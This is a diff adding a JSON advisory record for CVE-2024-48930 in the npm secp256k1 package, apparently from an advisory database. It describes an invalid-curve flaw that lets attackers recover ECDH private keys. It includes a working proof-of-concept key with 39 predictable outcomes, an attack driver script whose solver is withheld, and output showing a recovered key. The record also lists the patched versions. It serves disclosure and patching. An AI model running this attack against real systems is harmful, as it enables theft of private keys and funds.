@@ -1,0 +1,80 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2024-10-21T17:28:27Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "secp256k1"
+  },
+  "Advisory": {
+    "DatabaseId": 264127,
+    "Id": "GSA_kwCzR0hTQS01ODRxLTZqOGotcjVwbc4ABAe_",
+    "GhsaId": "GHSA-584q-6j8j-r5pm",
+    "References": [
+      {
+        "Url": "https://github.com/cryptocoinjs/secp256k1-node/security/advisories/GHSA-584q-6j8j-r5pm"
+      },
+      {
+        "Url": "https://github.com/cryptocoinjs/secp256k1-node/commit/9a15fff274f83a6ec7f675f1121babcc0c42292f"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48930"
+      },
+      {
+        "Url": "https://github.com/cryptocoinjs/secp256k1-node/commit/8bd6446e000fa59df3cda0ae3e424300747ea5ed"
+      },
+      {
+        "Url": "https://github.com/cryptocoinjs/secp256k1-node/commit/e256905ee649a7caacc251f7c964667195a52221"
+      },
+      {
+        "Url": "https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19"
+      },
+      {
+        "Url": "https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-584q-6j8j-r5pm"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-584q-6j8j-r5pm"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2024-48930"
+      }
+    ],
+    "Description": "### Summary\n\nIn `elliptic`-based version, `loadUncompressedPublicKey` has a check that the public key is on the curve: https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39\n\n`loadCompressedPublicKey` is, however, missing that check: https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19\n\nThat allows the attacker to use public keys on low-cardinality curves to extract enough information to fully restore the private key from as little as 11 ECDH sessions, and very cheaply on compute power\n\nOther operations on public keys are also affected, including e.g. `publicKeyVerify()` incorrectly returning `true` on those invalid keys, and e.g. `publicKeyTweakMul()` also returning predictable outcomes allowing to restore the tweak \n\n### Details\n\nThe curve equation is `Y^2 = X^3 + 7`, and it restores `Y` from `X` in `loadCompressedPublicKey`, using `Y = sqrt(X^3 + 7)`, but when there are no valid `Y` values satisfying `Y^2 = X^3 + 7` for a given `X`, the same code calculates a solution for `-Y^2 = X^3 + 7`, and that solution also satisfies some other equation `Y^2 = X^3 + D`, where `D` is not equal to 7 and might be on a curve with factorizable cardinality, so `(X,Y)` might be a low-order point on that curve, lowering the number of possible ECDH output values to bruteforcable\n\nThose output values correspond to remainders which can be then combined with Chinese remainder theorem to restore the original value\n\nEndomorphism-based multiplication only slightly hinders restoration and does not affect the fact that the result is low-order\n\n10 different malicious X values could be chosen so that the overall extracted information is 238.4 bits out of 256 bit private key, and the rest is trivially bruteforcable with an additional 11th public key (which might be valid or not -- not significant)\n\nThe attacker does not need to _receive_ the ECDH value, they only need to be able to confirm it against a list of possible candidates, e.g. check if using it to decipher block/stream cipher would work -- and that could all be done locally on the attacker side\n\n### PoC\n\n#### Example public key\n\nThis key has order 39\nOne of the possible outcomes for it is a throw, 38 are predictable ECDH values\nKeys used in full attack have higher order (starting from ~20000), so are very unlikely to cause an error\n\n```js\nimport secp256k1 from 'secp256k1/elliptic.js'\nimport { randomBytes } from 'crypto'\n\nconst pub = Buffer.from('028ac57f9c6399282773c116ef21f7394890b6140aa6f25c181e9a91e2a9e3da45', 'hex')\n\nconst seen = new Set()\nfor (let i = 0; i \u003c 1000; i++) {\n  try {\n    seen.add(Buffer.from(secp256k1.ecdh(pub, randomBytes(32))).toString('hex'))\n  } catch {\n    seen.add('failure also is an outcome')\n  }\n}\n\nconsole.log(seen.size) // 39\n```\n\n#### Full attack\nThis PoC doesn't list the exact public keys or the code for `solver.js` intentionally, but this exact code works, on arbitrary random private keys:\n\n```js\n// Only the elliptic version is affected, gyp one isn't\n// Node.js can use both, Web/RN/bundles always use the elliptic version\nimport secp256k1 from 'secp256k1/elliptic.js'\n\nimport { randomBytes } from 'node:crypto'\nimport assert from 'node:assert/strict'\nimport { Solver } from './solver.js'\n\nconst privateKey = randomBytes(32)\n\n// The full dataset is precomputed on a single MacBook Air in a few days and can be reused for any private key\nconst solver = new Solver\n\n// We need to run on 10 specially crafted public keys for this\n// Lower than 10 is possible but requires more compute\nfor (let i = 0; i \u003c 10; i++) {\n  const letMeIn = solver.ping() // this is a normal 33-byte Uint8Array, a 02/03-prefixed compressed public key\n  assert(letMeIn instanceof Uint8Array) // true\n  assert(secp256k1.publicKeyVerify(letMeIn)) // true\n\n  // Returning ecdh value is not necessary but is used in this demo for simplicity\n  // Solver needs to _confirm_ an ecdh value against a set of precalculated known ones,\n  // which can be done even after it's hashed or used e.g. for a stream/block cipher, based on the encrypted data\n  solver.callback(secp256k1.ecdh(letMeIn, privateKey))\n\n  // Btw we have those precomputed so we can actually use those sessions to lower suspicion, most -- instantly\n}\n\n// Now, we need a single valid (or another invalid) public key to recheck things against\n// It can be anything, e.g. we can specify an 11th one, or create a valid one and use it\n// We'll be able to confirm/restore and use the ecdh value for this session too upon privateKey extraction\nconst anyPublicKey = secp256k1.publicKeyCreate(randomBytes(32))\nassert(secp256k1.publicKeyVerify(anyPublicKey)) // true (obviously)\n\n// Full complexity of this exploit requires solver to perform ~ 2^35 ecdh value checks (for all 10 keys combined),\n// which is ~ 1 TiB -- that can be done offline and does not require any further interaction with the target\n// The exact speed of the comparison step depends on how the ecdh values are used, but is not very significant\n// Direct non-indexed linear scan over all possible (precomputed) values takes \u003c10 minutes on a MacBook Air\n// Confirming against e.g. cipher output would be somewhat slower, but still definitely possible + also could be precomputed\nconst extracted = solver.stab(anyPublicKey, secp256k1.ecdh(anyPublicKey, privateKey))\n\nconsole.log(`Extracted private key:  ${extracted.toString('hex')}`)\nconsole.log(`Actual private key was: ${privateKey.toString('hex')}`)\n\nassert(extracted.toString('hex') === privateKey.toString('hex'))\n\nconsole.log('Oops')\n```\n\nResult:\n```console\nExtracted private key:  e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d\nActual private key was: e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d\nOops\nnode example.js  178.80s user 13.59s system 74% cpu 4:17.01 total\n```\n\n### Impact\n\nRemote private key is extracted over 11 ECDH sessions\n\nThe attack is very low-cost, precompute took a few days on a single MacBook Air, and extraction takes ~10 minutes on the same MacBook Air\n\nAlso:\n* `publicKeyVerify()` misreports malicious public keys as valid\n* Same affects tweak extraction from `publicKeyTweakMul` result and other public key operations",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2024-10-21T17:28:26Z",
+    "Severity": "HIGH",
+    "Summary": "secp256k1-node allows private key extraction over ECDH",
+    "UpdatedAt": "2024-10-21T19:09:45Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.8.1"
+      },
+      "VulnerableVersionRange": "\u003c= 3.8.0"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.0.4"
+      },
+      "VulnerableVersionRange": "\u003e= 4.0.0, \u003c 4.0.4"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.0.1"
+      },
+      "VulnerableVersionRange": "= 5.0.0"
+    }
+  ]
+}
